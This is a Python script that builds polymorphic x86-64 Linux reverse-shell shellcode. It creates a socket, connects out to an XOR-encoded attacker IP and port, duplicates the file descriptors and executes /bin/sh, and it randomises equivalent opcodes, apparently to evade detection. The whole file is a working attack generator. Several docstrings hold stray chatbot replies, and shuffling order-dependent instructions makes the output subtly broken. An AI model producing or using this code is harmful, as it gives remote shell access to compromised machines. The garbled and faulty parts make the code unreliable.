#!/usr/bin/env python3

import random
import re
import sys
from socket import htons

def ip_to_opcode(ip_address):
    """
    The function `ip_to_opcode` converts an IP address to a series of hexadecimal opcodes.
    
    :param ip_address: I see that the function `ip_to_opcode` takes an IP address as input and converts
    it into an opcode. If you provide me with an IP address, I can help you convert it into the
    corresponding opcode. Please provide the IP address you would like to convert
    :return: The function `ip_to_opcode` takes an IP address as input, converts it to a hexadecimal
    representation, performs a bitwise XOR operation with the hexadecimal value `0xdeadbeef`, and then
    returns the result in a specific format.
    """
    ip_bytes = list(reversed(ip_address.split(".")))
    ip_hex = "0x" + "".join(["%.2x" % int(byte) for byte in ip_bytes])
    asm_iter = iter("%.2x" % (int(ip_hex, 16) ^ 0xdeadbeef))
    return ' '.join(list(reversed([''.join(pair) for pair in zip(asm_iter, asm_iter)])))

def port_to_opcode(port):
    """
    The function `port_to_opcode` converts a port number to a formatted string of hexadecimal opcodes.
    
    :param port: The `port_to_opcode` function takes a port number as input and converts it into a
    formatted string of opcodes. The function first converts the port number to network byte order using
    `htons` function, then converts it to hexadecimal representation, and finally formats it as opcodes
    :return: The function `port_to_opcode` takes a port number as input and converts it to a hexadecimal
    opcode format. The function first converts the port number to network byte order using `htons`, then
    converts it to a hexadecimal string representation. Finally, it rearranges the hexadecimal pairs and
    returns them as a string separated by spaces.
    """
    port_chars = iter("%.2x" % (htons(port)))
    return ' '.join(list(reversed([''.join(pair) for pair in zip(port_chars, port_chars)])))

def syscall_opcode():
    """
    The function `syscall_opcode` returns the hexadecimal opcode "0f 05".
    :return: The function `syscall_opcode()` is returning the hexadecimal string "0f 05".
    """
    return "0f 05"

def clean_register_opcode(register):
    """
    The function `clean_register_opcode` returns a random opcode based on the input register.
    
    :param register: The `clean_register_opcode` function takes a register name as input and returns a
    random opcode associated with that register. The opcodes are stored in a dictionary where the
    register names are keys and the corresponding opcodes are values
    :return: The `clean_register_opcode` function returns a randomly chosen opcode string associated
    with the input register. If the input register is not found in the dictionary `opcodes`, an empty
    string is returned.
    """
    opcodes = {
        'rax': ["48 31 c0", "4d 31 c0 4c 89 c0"],
        'rbx': ["48 31 db", "4d 31 c0 4c 89 c3"],
        'rcx': ["48 31 c9", "4d 31 c0 4c 89 c1"],
        'rdx': ["48 31 d2", "4d 31 c0 4c 89 c2"],
        'rsi': ["48 31 f6", "4d 31 c0 4c 89 c6"],
        'rdi': ["48 31 ff", "4d 31 c0 4c 89 c7"]
    }
    return random.choice(opcodes.get(register, [""]))

def socket_opcode():
    """
    The function `socket_opcode` generates opcodes for creating a socket by randomly selecting from
    predefined sets of opcodes.
    :return: The `socket_opcode` function returns a string that is generated by joining randomly chosen
    opcodes from the `opcodes` list and appending the result of the `syscall_opcode` function.
    """
    opcodes = [
        ["b0 29", "b0 28 04 01"],
        ["40 b7 02", "40 b7 01 40 80 c7 01"],
        ["40 b6 01", "40 b6 02 40 80 ee 01"]
    ]
    return ' '.join([random.choice(opcode) for opcode in opcodes]) + ' ' + syscall_opcode()

def connect_opcode(ip, port):
    """
    The function `connect_opcode` generates opcodes for connecting to a specified IP and port.
    
    :param ip: I see that you are trying to generate opcodes for connecting to a specified IP and port.
    However, it seems like the IP address is missing in your code snippet. Could you please provide me
    with the IP address so that I can assist you in generating the opcodes for connecting to that IP and
    :param port: Port is a communication endpoint in networking. It is a 16-bit number used to identify
    specific processes or services running on a computer. Common ports include 80 for HTTP, 443 for
    HTTPS, and 22 for SSH. If you provide me with the specific port number you want to generate op
    :return: The `connect_opcode` function generates opcodes for connecting to a specified IP and port.
    It returns a string that consists of randomly selected opcodes from a list, representing the
    instructions needed to establish a connection to the specified IP and port, followed by the opcode
    for a system call.
    """
    ip_opcodes = ip_to_opcode(ip)
    port_opcodes = port_to_opcode(port)
    opcodes = [
        "49 89 c7", "4d 31 c0 49 89 c0 4d 89 c7",
        "48 89 c7", "4d 31 c0 49 89 c0 4c 89 c7",
        clean_register_opcode('rax'),
        "b0 2a", "b0 29 04 01", "53",
        f"be {ip_opcodes}", "81 f6 ef be ad de",
        f"66 68 {port_opcodes}", "66 6a 02",
        "48 89 e6", "4d 31 c0 49 89 e0 4c 89 c6",
        "b2 18", "4d 31 c0 41 b0 18 44 88 c2"
    ]
    return ' '.join(random.sample(opcodes, len(opcodes))) + ' ' + syscall_opcode()

def dup2x3_opcode():
    """
    The `dup2x3_opcode` function generates a sequence of opcodes for duplicating file descriptors in
    assembly language.
    :return: The `dup2x3_opcode` function is returning a randomly shuffled combination of opcodes
    related to register manipulation and system calls. The opcodes include instructions for cleaning
    registers, setting specific values, and performing system calls. The function then appends a syscall
    opcode to the end of the shuffled opcodes before returning the final string.
    """
    opcodes = [
        clean_register_opcode('rax'), clean_register_opcode('rdx'),
        "b0 21", "b0 20 04 01", "4c 89 ff", "4d 31 c0 4d 89 f8 4c 89 c7",
        clean_register_opcode('rsi'), "b0 21", "b0 20 04 01",
        "4c 89 ff", "4d 31 c0 4d 89 f8 4c 89 c7", clean_register_opcode('rsi'),
        "40 b6 01", "4d 31 c0 41 b0 01 44 88 c6", "b0 21", "b0 20 04 01",
        "4c 89 ff", "4d 31 c0 4d 89 f8 4c 89 c7", clean_register_opcode('rsi'),
        "40 b6 02", "4d 31 c0 41 b0 02 44 88 c6"
    ]
    return ' '.join(random.sample(opcodes, len(opcodes))) + ' ' + syscall_opcode()

def make_shell_opcode():
    """
    The function `make_shell_opcode` generates opcodes to execute `/bin/sh` in Python.
    :return: The function `make_shell_opcode()` returns a string that consists of randomly selected
    opcodes from a list, followed by a syscall opcode. The opcodes are used to execute `/bin/sh` in
    assembly language.
    """
    opcodes = [
        clean_register_opcode('rax'), clean_register_opcode('rdx'),
        "48 bb 2f 2f 62 69 6e 2f 73 68", "4d 31 c0 49 b8 2f 2f 62 69 6e 2f 73 68 4c 89 c3",
        "50", "53", "48 89 e7", "4d 31 c0 49 89 e0 4c 89 c7", "50", "57",
        "48 89 e6", "4d 31 c0 49 89 e0 4c 89 c6", "b0 3b", "b0 3c 2c 01"
    ]
    return ' '.join(random.sample(opcodes, len(opcodes))) + ' ' + syscall_opcode()

def generate_shellcode(ip, port):
    """
    The function generates shellcode for establishing a reverse shell connection.
    
    :param ip: The `ip` parameter in the `generate_shellcode` function is the IP address of the target
    machine to which you want to connect and spawn a shell. It is a string representing the IPv4 address
    in dot-decimal notation (e.g., "192.168.1.10")
    :param port: The `port` parameter is the port number that you want to connect to in the
    `generate_shellcode` function. It is used to specify the port for the socket connection in the
    shellcode generation process
    :return: The function `generate_shellcode(ip, port)` returns the shellcode generated for connecting
    to the specified IP address and port, along with the length of the shellcode.
    """
    opcodes = ''
    opcodes += clean_register_opcode('rax')
    opcodes += clean_register_opcode('rbx')
    opcodes += clean_register_opcode('rcx')
    opcodes += clean_register_opcode('rdx')
    opcodes += clean_register_opcode('rsi')
    opcodes += clean_register_opcode('rdi')
    opcodes += socket_opcode()
    opcodes += connect_opcode(ip, port)
    opcodes += dup2x3_opcode()
    opcodes += make_shell_opcode()

    shellcode = ''.join(["\\x" + opcode for opcode in re.findall("[a-f0-9]{2}", opcodes)])
    return shellcode, len(shellcode)

def main():
    """
    The main function generates shellcode for a specified IP address and port number.
    """
    ip = "192.168.1.100"  # IP
    port = 4444            # PORT

    print("[.] Generating shellcode...")
    shellcode, length = generate_shellcode(ip, port)

    print(f"[+] {length} bytes shellcode generated for {ip}:{port}")
    print(f"\n{shellcode}\n")

if __name__ == "__main__":
    main()
